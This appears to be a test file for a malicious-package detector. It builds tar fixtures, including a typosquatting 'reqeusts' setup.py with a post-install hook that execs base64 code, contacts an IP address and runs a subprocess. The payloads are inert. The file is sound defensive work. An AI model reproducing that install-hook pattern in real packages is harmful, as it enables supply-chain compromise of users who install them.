import io
import tarfile

from suspackage.archive import read_package
from suspackage.features import code, metadata, setup_py
from suspackage.features.name import NameFeatures

CFG = {"zip_password": "infected", "max_files": 5000, "max_py_bytes": 1_000_000, "max_total_py_bytes": 6_000_000}

# Inert fixtures: they contain suspicious-looking text but are never executed.
BAD_SETUP = '''
import base64, subprocess, urllib.request
from setuptools import setup
from setuptools.command.install import install
class PostInstall(install):
    def run(self):
        exec(base64.b64decode("cHJpbnQoJ2hpJyk="))
        urllib.request.urlopen("http://203.0.113.7/x")
        subprocess.run(["echo", "hi"])
setup(name="reqeusts", cmdclass={"install": PostInstall})
'''
GOOD_SETUP = "from setuptools import setup\nsetup(name='nice-lib', version='1.0')\n"


def make_tar(tmp_path, files):
    p = tmp_path / "pkg.tar.gz"
    with tarfile.open(p, "w:gz") as tf:
        for name, text in files.items():
            data = text.encode()
            ti = tarfile.TarInfo(name)
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
    return str(p)


def test_malicious_fixture(tmp_path):
    path = make_tar(tmp_path, {"reqeusts-1.0/setup.py": BAD_SETUP, "reqeusts-1.0/PKG-INFO": "Name: reqeusts\nSummary: UNKNOWN\nHome-page: UNKNOWN\n"})
    pkg = read_package(path, CFG)
    sp = setup_py.features(pkg.setup_py)
    assert sp["sp_cmdclass"] and sp["sp_subprocess"] and sp["sp_network"] and sp["sp_exec_eval"] and sp["sp_base64"]
    c = code.features(pkg.py)
    assert c["c_exec_eval"] == 1 and c["c_b64_decode"] == 1 and c["c_subprocess"] == 1
    assert c["c_ip_literals"] == 1
    m = metadata.features(pkg.pkg_info)
    assert m["meta_has_description"] == 0 and m["meta_has_homepage"] == 0


def test_benign_fixture(tmp_path):
    info = "Name: nice-lib\nSummary: A helper\nHome-page: https://example.org\nAuthor: A\nRequires-Dist: six\n\nLong text"
    pkg = read_package(make_tar(tmp_path, {"nice-lib-1.0/setup.py": GOOD_SETUP, "nice-lib-1.0/PKG-INFO": info}), CFG)
    c = code.features(pkg.py)
    assert c["c_exec_eval"] == 0 and c["c_subprocess"] == 0 and c["obfuscation_score"] == 0
    m = metadata.features(pkg.pkg_info)
    assert m["meta_has_description"] and m["meta_has_homepage"] and m["meta_has_author"] and m["meta_n_deps"] == 1


def test_syntax_error_falls_back(tmp_path):
    pkg = read_package(make_tar(tmp_path, {"p-1/a.py": "print 'x'\nexec(open('f').read())\n"}), CFG)
    c = code.features(pkg.py)
    assert c["parse_fail_ratio"] == 1.0 and c["c_exec_eval"] == 1


def test_name_features_skip_self():
    nf = NameFeatures(["requests", "numpy", "flask"])
    assert nf("requests")["name_edit_dist"] > 0          # never compared with itself
    f = nf("reqeusts")
    assert f["x_nearest_popular"] == "requests" and f["name_edit_dist"] == 2 and f["is_typosquat"] == 1
